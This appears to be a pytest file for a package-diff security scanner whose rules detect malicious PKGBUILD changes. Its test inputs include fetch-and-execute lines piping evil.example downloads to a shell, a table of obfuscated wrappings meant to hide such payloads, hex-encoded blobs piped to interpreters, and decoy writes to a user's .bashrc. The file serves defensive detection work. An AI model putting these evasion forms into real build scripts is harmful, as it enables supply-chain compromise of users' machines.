"""Crossfire rule shapes: scope, wrappers, whitespace, bounded matching.

Continuation of ``tests/test_crossfire.py``; shares its ``_fire`` helper and
``EVASIONS`` table.
"""

import pytest

from trustsight.analysis import scan_diff  # noqa: F401
from trustsight.analysis.crossfire import crossfire_techniques

from tests.test_crossfire import _fire

# ---------------------------------------------------------------------------
# Two structural faults, both of which decided *where* a rule looked rather
# than what it matched. Between them they were every remaining benign-corpus
# hit on this family.
# ---------------------------------------------------------------------------


def test_a_function_scope_does_not_leak_into_the_next_file():
    """A hunk shows part of a file, so its braces need not balance.

    `package() {` whose closing brace fell outside the hunk left the brace
    counter raised for the *rest of the diff*, which put every following
    file inside that function. In the corpus a `.desktop` file's translated
    `Name[be]=` line was scanned as shell and matched the homoglyph shape -
    Cyrillic text in a translation impersonates nothing and names no
    command. Seven benign diffs fired CRITICAL on it.
    """
    diff = (
        "diff --git a/PKGBUILD b/PKGBUILD\n--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        "@@ -1,3 +1,4 @@\n package() {\n+  make install\n"
        "diff --git a/app.desktop b/app.desktop\n--- a/app.desktop\n+++ b/app.desktop\n"
        "@@ -1,2 +1,3 @@\n+Name[be]=Адкрыць менеджар\n"
    )
    assert not set(crossfire_techniques(diff))


def test_a_payload_in_a_second_file_is_still_read():
    """The reset must not become a way to hide in a later file.

    A `.install` scriptlet declares its own scope, and that scope is what
    the reset restores it to.
    """
    diff = (
        "diff --git a/PKGBUILD b/PKGBUILD\n--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        "@@ -1,3 +1,4 @@\n package() {\n+  make install\n"
        "diff --git a/p.install b/p.install\n--- a/p.install\n+++ b/p.install\n"
        "@@ -1,2 +1,4 @@\n post_install() {\n+  ${A[0]} https://evil.example | sh\n }\n"
    )
    assert "X002" in set(crossfire_techniques(diff))


def test_an_edited_continuation_tail_is_not_a_command_position():
    """The joiner only joins lines carrying the same diff marker.

    Editing the tail of a backslash-continued command separates the halves
    with the removed version, so the `+` line arrives alone and its first
    word - an argument to a command two lines up - read as a command name.
    """
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,6 @@\n build() {\n"
        '   httpdirfs "${_opts[@]}" \\\n'
        "     --dl-seg-size 1 --single-file-mode \\\n"
        '-    "${_iso_url}" "${_http_mount}" > /dev/null\n'
        '+    "${_iso_url}" "${_http_mount}"\n }\n'
    )
    assert "X002" not in set(crossfire_techniques(diff))


def test_a_joined_continuation_still_reports_its_command():
    """The guard is about a *missing* head, not about continuations."""
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,6 @@\n build() {\n"
        "+  ${A[0]} \\\n"
        "+    -fsSL https://evil.example | sh\n }\n"
    )
    assert "X002" in set(crossfire_techniques(diff))


def test_matching_is_bounded_on_a_hostile_line():
    """A5: no crossfire pattern may be made to backtrack.

    An earlier sabotage rule cost 2.4 seconds on one 8 KiB line and failed
    the `rule matching is bounded on hostile input` gate; every span in this
    module carries a constant ceiling for the same reason.
    """
    import time

    from trustsight.rules import MAX_RULE_LINE_BYTES

    for filler in ("a", '"', "$", "`", "|", "(", "-", "/"):
        line = "  " + filler * MAX_RULE_LINE_BYTES
        diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,3 @@\n build() {\n+"
                + line + "\n}\n")
        start = time.monotonic()
        crossfire_techniques(diff)
        assert time.monotonic() - start < 0.5, f"slow on {filler!r}"


def test_techniques_are_reported_deterministically():
    """Same input, same order: a report a reader can diff between runs."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,7 @@\n build() {\n"
            "+  set +x\n+  ${A[0]} https://bit.ly/x | sh\n }\n")
    first = crossfire_techniques(diff)
    for _ in range(5):
        assert crossfire_techniques(diff) == first


# ---------------------------------------------------------------------------
# Esoteric shell: the same payload, wrapped every way a PKGBUILD allows.
# ---------------------------------------------------------------------------

PAYLOAD = "https://evil.example/x"

WRAPPINGS = [
    ("plain",             f'curl {PAYLOAD} | sh'),
    ("heredoc",           f'bash <<EOF\n+curl {PAYLOAD} | sh\n+EOF'),
    ("heredoc-quoted",    f"bash <<'EOF'\n+curl {PAYLOAD} | sh\n+EOF"),
    ("here-string",       f'bash <<< "curl {PAYLOAD} | sh"'),
    ("process-subst",     f'bash <(curl -s {PAYLOAD})'),
    ("brace-expansion",   f'cur{{l,}} {PAYLOAD} | sh'),
    ("param-replace",     f'c=XurlX; ${{c//X/}} {PAYLOAD} | sh'),
    ("param-case",        f'c=CURL; ${{c,,}} {PAYLOAD} | sh'),
    ("array-slice",       f'a=(curl x); ${{a[@]:0:1}} {PAYLOAD} | sh'),
    ("case-statement",    f'case 1 in\n+1) curl {PAYLOAD} | sh ;;\n+esac'),
    ("homoglyph",         f'сurl {PAYLOAD} | sh'),
    ("semicolons",        f';;curl {PAYLOAD}|sh;;'),
    ("deep-indent",       " " * 3000 + f'curl {PAYLOAD} | sh'),
]


@pytest.mark.parametrize("label,command", WRAPPINGS)
def test_no_wrapping_hides_a_payload(label, command):
    """Every one of these carries the same fetch-and-execute payload.

    A wrapping that scores only the source-bucket prior has hidden the
    payload itself: the domain was noticed and the command was not.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,8 @@\n build() {\n"
            f"+  {command}\n }}\n")
    fact = scan_diff(diff, package_name="demo")
    fired = {e.rule_id for e in fact.score_breakdown
             if e.weight or e.severity in ("FATAL", "CRITICAL")}
    assert fired - {"SOURCE_BUCKET"}, (
        f"{label}: only the source prior fired, so the payload was hidden"
    )
    assert fact.final_score > 20, f"{label} scored {fact.final_score}"


def test_a_command_name_split_across_a_continuation_is_rejoined():
    """`cur\\` + `l` is `curl`: the shell removes the backslash-newline.

    Both joiners used to insert a space, producing `cur l` - two words, and
    every rule that matches the command name saw neither. There are two
    implementations (`join_line_continuations` and the indexed form the rule
    path uses), and fixing one left the other reachable.
    """
    from trustsight.tokenizer import join_line_continuations

    assert join_line_continuations(["+  cur\\", "+l https://x | sh"]) == [
        "+  curl https://x | sh"
    ]
    # Indentation on the continuation still separates arguments.
    assert join_line_continuations(["+  curl \\", "+    https://x"]) == [
        "+  curl     https://x"
    ]

    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n build() {\n"
            "+  cur\\\n+l https://evil.example/x | sh\n+}\n")
    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "R001" in fired, "the rejoined command must reach the payload rules"


@pytest.mark.parametrize("label,command", [
    ("cyrillic-c",  "сurl https://x | sh"),
    ("cyrillic-o",  "cоrl https://x | sh"),
    ("brace-comma", "cur{l,} https://x"),
    ("brace-range", "cmd{1..3} https://x"),
])
def test_x002_claims_assembled_and_impersonating_names(label, command):
    assert "X002" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    # A typographic apostrophe impersonates nothing and names no command.
    ("prose-apostrophe", "wizard’s default settings apply here"),
    ("brace-argument",   "cp file{1,2}.txt /tmp"),
    ("emoji-echo",       "echo \U0001F600 done"),
])
def test_x002_does_not_fire_on_ordinary_non_ascii(label, command):
    """"Any non-ASCII" was too broad: it fired on English prose."""
    assert "X002" not in _fire(command), label


# ---------------------------------------------------------------------------
# X008: whitespace a shell does not split on.
# ---------------------------------------------------------------------------

#: (label, codepoint). Python calls each of these whitespace; bash splits on
#: none of them, so a word containing one stays a single word.
DECEPTIVE_SPACES = [
    ("nbsp", "\u00a0"),
    ("narrow-nbsp", "\u202f"),
    ("figure-space", "\u2007"),
    ("ogham-space", "\u1680"),
    ("ideographic-space", "\u3000"),
    ("next-line", "\u0085"),
    ("line-separator", "\u2028"),
]


@pytest.mark.parametrize("label,space", DECEPTIVE_SPACES)
def test_whitespace_a_shell_will_not_split_on_is_reported(label, space):
    """`make<NBSP>install` displays as a command and runs as one word.

    bash splits on space, tab and newline; Python's `\\s` matches all of
    these too, so a payload rule fires *around* one - R001 reported "curl
    piped to bash" for a line that runs no curl. R013 is FATAL and claims
    bidi, zero-width and tag codepoints; these are a disjoint set, so
    nothing scored or reported them.
    """
    assert "X008" in _fire(f"make{space}install"), label


@pytest.mark.parametrize("label,command", [
    ("space", "make install"),
    ("tab", "make\tinstall"),
    ("many-spaces", "make    install"),
    ("carriage-return", "make install\r"),
])
def test_ordinary_whitespace_is_not_reported(label, command):
    assert "X008" not in _fire(command), label


def test_x008_claims_no_codepoint_r013_claims():
    """The two sets are disjoint, which is why both can score.

    R013 is FATAL; double-scoring a codepoint would corrupt the calibration
    the project measures, and is the reason the bidi and homoglyph
    candidates were dropped from this family in the first place.
    """
    from trustsight.analysis import scan_diff
    from trustsight.analysis.crossfire import _DECEPTIVE_SPACE_RE

    for codepoint in ("\u200b", "\u202e", "\ufeff", "\u2066"):
        assert not _DECEPTIVE_SPACE_RE.search(codepoint), (
            f"U+{ord(codepoint):04X} is R013's, and X008 must not claim it"
        )
        diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
                f"+  make{codepoint}install\n }}\n")
        fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
        assert "R013" in fired, f"U+{ord(codepoint):04X} should still be R013's"


def test_a_licence_file_is_not_a_shell_file():
    """The one benign-corpus diff carrying such a character is font licence
    text, which the file gate excludes before X008 ever sees it."""
    diff = ("--- a/LICENSE\n+++ b/LICENSE\n@@ -1,2 +1,3 @@\n"
            "+A. Limited License.\u00a0Subject to the terms\n")
    assert "X008" not in set(crossfire_techniques(diff))


# ---------------------------------------------------------------------------
# Case, and the exemption that decides whether X005 speaks at all.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("label,command", [
    # `$PKGDIR` is not a makepkg variable. It expands to nothing, so the
    # write lands in a home directory while claiming the staging exemption -
    # bought for the price of a shift key.
    ("uppercase-decoy", 'install -Dm644 x "$PKGDIR/../../home/alice/.bashrc"'),
    ("mixed-case-decoy", 'install -Dm644 x "$PkgDir/../../home/alice/.bashrc"'),
    # The exemption belongs to the target, not to the line: a real `$pkgdir`
    # somewhere else on the line used to buy silence for a write that has
    # nothing to do with staging.
    ("decoy-elsewhere", 'echo "$pkgdir" && cp payload /home/alice/.bashrc'),
    ("decoy-in-argument", 'cp "$pkgdir/x" /home/alice/.bashrc'),
])
def test_the_staging_exemption_does_not_cover_a_decoy(label, command):
    assert "X005" in _fire(command, function="package"), label


@pytest.mark.parametrize("label,command", [
    ("staged-write", 'install -Dm755 t "$pkgdir/home/shared/tool"'),
    ("staged-srcdir", 'cp t "$srcdir/home/x"'),
    ("staged-braced", 'install -Dm644 c "${pkgdir}/home/skel/.bashrc"'),
])
def test_a_genuinely_staged_write_is_still_exempt(label, command):
    """Narrowing the exemption must not turn packaging into a finding."""
    assert "X005" not in _fire(command, function="package"), label


@pytest.mark.parametrize("label,command", [
    ("uppercase-scheme-ip", 'source=("HTTPS://1.2.3.4/p.tar.gz")'),
    ("mixed-scheme-ip", 'source=("Https://1.2.3.4/p.tar.gz")'),
    ("uppercase-shortener", 'source=("HTTPS://BIT.LY/xyz")'),
])
def test_a_url_scheme_is_case_insensitive(label, command):
    """RFC 3986 says so and curl agrees, so a shift key was a way past.

    The shortener shape beside these was already case-insensitive, which is
    what makes the inconsistency an accident rather than a decision.
    """
    assert "X006" in _fire(command, function="build"), label


def test_an_encoded_host_survives_an_uppercase_scheme():
    assert "X003" in _fire("curl -fsSL HTTP://0x7f000001/p", function="build")


# ---------------------------------------------------------------------------
# X001: the executor list, which is a list.
# ---------------------------------------------------------------------------

PAYLOAD = r"printf '\x63\x75\x72\x6c'"

EXECUTORS = [
    "sh", "bash", "zsh", "dash", "ksh",
    # Every one of these ran the payload while X001 said nothing.
    "ash", "mksh", "pdksh", "yash", "posh",
    "busybox sh", "busybox ash", "/bin/busybox sh",
    "env -S sh", "env -i bash", "command -p sh",
    "source /dev/stdin", ". /dev/stdin",
    # An interpreter executes decoded bytes exactly as a shell does, and no
    # recipe pipes a hex-escape blob into one by accident.
    "python", "python3", "perl", "ruby", "node",
]


@pytest.mark.parametrize("executor", EXECUTORS)
def test_x001_catches_every_executor_spelling(executor):
    """R001 already knew about `busybox sh` and `source /dev/stdin`, which
    is the tell that the omission here was an oversight, not a boundary."""
    assert "X001" in _fire(f"{PAYLOAD} | {executor}"), executor


@pytest.mark.parametrize("command", [
    "printf 'plain text' | tee out",
    "echo hello | grep -q x",
    "cat data.txt | sort | uniq",
])
def test_x001_needs_the_encoding_not_just_a_pipe(command):
    """The escape blob is what makes an interpreter suspicious here."""
    assert "X001" not in _fire(command), command


# ---------------------------------------------------------------------------
# X003 and X004: spellings of the same instruction.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("label,command", [
    ("bare", "set +x"),
    ("x-last", "set +vx"),
    # Caught or missed on nothing but letter order, because the pattern
    # required the `x` to end the cluster.
    ("x-first", "set +xv"),
    ("x-middle", "set +vxe"),
    ("long-form", "set +o xtrace"),
    ("verbose", "set +o verbose"),
])
def test_x004_catches_every_spelling_of_trace_off(label, command):
    assert "X004" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("bare", "TERM=dumb make"),
    # A quote sets exactly the same variable.
    ("single-quoted", "TERM='dumb' make"),
    ("double-quoted", 'TERM="dumb" make'),
    ("exported", "export TERM=dumb"),
])
def test_x004_catches_a_quoted_term(label, command):
    assert "X004" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("stdout", "exec >/dev/null"),
    ("stderr", "exec 2>/dev/null"),
    # Appending detaches the stream as thoroughly as truncating it, and
    # `&>` takes both at once. Both were silent.
    ("append", "exec 2>>/dev/null"),
    ("both-streams", "exec &>/dev/null"),
    ("append-both", "exec &>>/dev/null"),
    ("close", "exec 2>&-"),
])
def test_x004_catches_every_detaching_redirect(label, command):
    assert "X004" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("login-then-c", "bash -lc 'id'"),
    ("errexit-then-c", "sh -ec 'id'"),
    # The `c` may sit anywhere in the cluster: `-ce` is the same
    # instruction as `-ec`, and requiring it last let both through.
    ("c-then-errexit", "sh -ce 'id'"),
    ("c-then-login", "bash -cl 'id'"),
    # A list that named five of a dozen shells is a rename away from empty.
    ("ash", "ash -lc 'id'"),
    ("mksh", "mksh -lc 'id'"),
    ("busybox", "busybox sh -lc 'id'"),
])
def test_x003_catches_option_stuffing_in_any_order(label, command):
    assert "X003" in _fire(command), label


@pytest.mark.parametrize("command", [
    "sh -c 'make install'",
    "bash -c 'true'",
    "set -e",
    "set +e",
    "TERM=xterm make",
    "exec 3>&1",
])
def test_ordinary_shell_is_not_option_stuffing_or_suppression(command):
    """`sh -c` is how a recipe runs a command; only the *stuffing* is the
    signal, and only a stream that goes nowhere is suppression."""
    got = _fire(command)
    assert "X003" not in got and "X004" not in got, f"{command}: {got}"


@pytest.mark.parametrize("keyword", ["export", "declare", "local", "readonly", "typeset"])
def test_a_declared_assignment_still_resolves_the_name(keyword):
    """X002 is CRITICAL, so a name the tokenizer *can* resolve must not
    reach it. `export CMD=curl` is an assignment like any other."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
            f"+  {keyword} CMD=curl\n+  $CMD https://evil.example\n }}\n")
    assert "X002" not in set(crossfire_techniques(diff)), keyword


# ---------------------------------------------------------------------------
# A bound is a bypass for anyone willing to type one more character.
# ---------------------------------------------------------------------------

#: (rule, short spelling, the same thing padded past the old bound). Each
#: bound was there for backtracking safety, and each was a length-based way
#: out: 41 characters inside the quotes, 61 before the confusable, 61 inside
#: the braces, 201 between the blob and the pipe.
PADDED_EVASIONS = [
    ("X002", 'c"u"rl https://evil.example',
             'c"' + "u" * 45 + '"rl https://evil.example'),
    ("X002", "\u0441url https://evil.example",
             "a" * 70 + "\u0441url https://evil.example"),
    ("X002", "cur{l,} https://evil.example",
             "cur{l," + "x" * 70 + "} https://evil.example"),
    ("X001", r"printf '\x63\x75\x72' | sh",
             r"printf '\x63\x75\x72' " + "-" * 250 + " | sh"),
]


@pytest.mark.parametrize("rule,short,padded", PADDED_EVASIONS)
def test_padding_does_not_walk_past_a_shape(rule, short, padded):
    assert rule in _fire(short), f"{rule}: the short spelling stopped matching"
    assert rule in _fire(padded), f"{rule}: padding walked past it"


@pytest.mark.parametrize("label,probe", [
    # The inputs that made the unbounded versions quadratic. A bound removed
    # in exchange for a quadratic is no trade: `is_superlinear` refuses
    # exactly this shape at compile time.
    ("brace with no close", "x{" + "," * 8192),
    ("many blobs, no pipe", "printf '" + "\\x63" * 2048),
    ("alternating quotes", 'a"' * 4096),
    ("quote run", '"' * 8192),
])
def test_an_unbounded_span_stays_linear(label, probe):
    import time

    from trustsight.analysis.crossfire import X001_RE, X002_SHAPES

    worst = 0.0
    for _name, rx in X002_SHAPES:
        start = time.perf_counter()
        rx.match(probe)
        worst = max(worst, time.perf_counter() - start)
    start = time.perf_counter()
    X001_RE.search(probe)
    worst = max(worst, time.perf_counter() - start)
    assert worst < 0.05, f"{label}: {worst * 1000:.0f}ms on one clamped line"


# ---------------------------------------------------------------------------
# X024: indirect assignment to a sensitive variable
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("command", [
    'DLAGENTS=("${_agents[@]}")',
    'COMPRESSZST=$(get_compress)',
    'CFLAGS="${_cflags[*]}"',
    'LDFLAGS=`echo $LDFLAGS`',
    'PACMAN_AUTH="${_auth}"',
    'MAKEFLAGS=("${_makeflags[@]}")',
    'PATH="${_newpath}"',
    'LD_PRELOAD="${_preload}"',
])
def test_x024_fires_on_indirect_assignment(command):
    assert "X024" in _fire(command)


@pytest.mark.parametrize("command", [
    "DLAGENTS=('http::/usr/bin/curl')",
    'CFLAGS="-O2 -march=x86-64"',
    "LDFLAGS=\"-Wl,-O1 -Wl,--as-needed\"",
    'MAKEFLAGS="-j$(nproc)"',
])
def test_x024_quiet_on_literal_assignment(command):
    assert "X024" not in _fire(command)


@pytest.mark.parametrize("command", [
    'export PATH="$PATH:$HOME/.cargo/bin"',
    'MAKEFLAGS="$MAKEFLAGS -j$(nproc)"',
    'export CGO_CPPFLAGS="${CPPFLAGS}"',
    'export CGO_CFLAGS="${CFLAGS}"',
    'export CGO_CXXFLAGS="${CXXFLAGS}"',
    'export CGO_LDFLAGS="${LDFLAGS}"',
])
def test_x024_quiet_on_a_passthrough(command):
    """The value begins by expanding the assigned variable itself.

    `PATH="$PATH:..."` appends and `CGO_CFLAGS="${CFLAGS}"` forwards the
    standard flags; both are the value the reviewer already sees, not an
    indirect value hidden in a variable.
    """
    assert "X024" not in _fire(command)


@pytest.mark.parametrize("command", [
    'CGO_CFLAGS="$EVIL"',
    'CFLAGS="${_evil}"',
    'PATH="${_newpath}"',
])
def test_x024_still_fires_when_the_value_is_not_the_same_variable(command):
    assert "X024" in _fire(command)


@pytest.mark.parametrize("command", [
    # skwd-wall-v2: a DBus address value, not a PATH assignment.
    'runuser -u "$user" -- env XDG_RUNTIME_DIR="$runtime" '
    'DBUS_SESSION_BUS_ADDRESS="unix:path=$runtime/bus" systemctl --user',
    'env DISPLAY=:0 XAUTHORITY="unix:path=$x/auth"',
])
def test_x024_ignores_a_path_substring_inside_a_value(command):
    assert "X024" not in _fire(command)


# ---------------------------------------------------------------------------
# X025: multi-line function shadow
# ---------------------------------------------------------------------------


def test_x025_fires_on_multiline_msg_shadow():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=demo\n"
            "+msg()\\\n"
            "+{\n"
            "+  echo 'clean'\n"
            "+}\n")
    assert "X025" in set(crossfire_techniques(diff))


def test_x025_fires_on_multiline_cd_shadow():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=demo\n"
            "+cd()\\\n"
            "+{\n"
            "+  builtin cd \"$@\"\n"
            "+}\n")
    assert "X025" in set(crossfire_techniques(diff))


def test_x025_quiet_on_multiline_build():
    """build() split across lines is not a shadow."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=demo\n"
            "+build()\\\n"
            "+{\n"
            "+  make\n"
            "+}\n")
    assert "X025" not in set(crossfire_techniques(diff))


def test_x025_quiet_on_single_line_shadow():
    """Single-line shadow is H097's job, not X025."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
            " pkgname=demo\n"
            "+msg() { echo 'clean'; }\n")
    assert "X025" not in set(crossfire_techniques(diff))


# ---------------------------------------------------------------------------
# Data that spells a command: dependency descriptions and printed heredocs
# ---------------------------------------------------------------------------


def test_x011_ignores_a_dependency_description():
    """lfff: an optdepends description that *describes* a cargo install.

    The value of a dependency array is data.  The parenthesised
    `cargo install payload_dumper` is how a user would install the
    optional tool, not a command the build runs.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=demo\n"
            "+optdepends=(\n"
            "+  'payload_dumper: OTA payload extraction "
            "(cargo install payload_dumper)'\n"
            "+)\n")
    assert "X011" not in set(crossfire_techniques(diff))


def test_x011_still_fires_on_the_line_that_runs_it():
    assert "X011" in _fire("cargo install wasm-bindgen-cli")


def test_x011_ignores_a_distro_install_inside_a_hook():
    """tape16-bin: `pacman -S xorg-xwayland` in post_install pulls the
    distribution's own signed packages at install time - not fetched code
    at build time."""
    diff = ("--- a/tape16-bin.install\n+++ b/tape16-bin.install\n@@ -0,0 +1,5 @@\n"
            "+post_install() {\n"
            "+  pacman -S --noconfirm xorg-xwayland\n"
            "+}\n")
    assert "X011" not in set(crossfire_techniques(diff))


def test_x011_still_fires_on_a_package_manager_in_a_build():
    assert "X011" in _fire("pip install requests")


@pytest.mark.parametrize(
    "command",
    [
        "v/bin/pip install demo",
        "./tools/node/bin/npm install evil",
        "/usr/bin/pip install demo",
    ],
)
def test_x011_reads_a_path_qualified_package_manager(command):
    """A vendored toolchain runs the same registry fetch through a path."""
    assert "X011" in _fire(command)


def test_x011_keeps_a_relative_local_target_quiet():
    """`npm install ./pkg` installs a local tree, not a registry package."""
    assert "X011" not in _fire("npm install ./vendor")


def test_x015_ignores_a_printed_heredoc():
    """melody-git: `cat <<'MESSAGE'` advises the user to enable a unit.

    The body is a message.  Following it into X015 made a printed
    instruction look like work scheduled on the building machine.
    """
    diff = ("--- a/melody.install\n+++ b/melody.install\n@@ -0,0 +1,5 @@\n"
            "+post_install() {\n"
            "+  cat <<'MESSAGE'\n"
            "+  systemctl --user enable --now melody-agent.service\n"
            "+MESSAGE\n"
            "+}\n")
    assert "X015" not in set(crossfire_techniques(diff))


def test_x015_still_fires_on_a_heredoc_handed_to_a_shell():
    diff = ("--- a/x.install\n+++ b/x.install\n@@ -0,0 +1,5 @@\n"
            "+post_install() {\n"
            "+  cat <<EOF | sh\n"
            "+  systemctl --user enable --now x.service\n"
            "+EOF\n"
            "+}\n")
    assert "X015" in set(crossfire_techniques(diff))
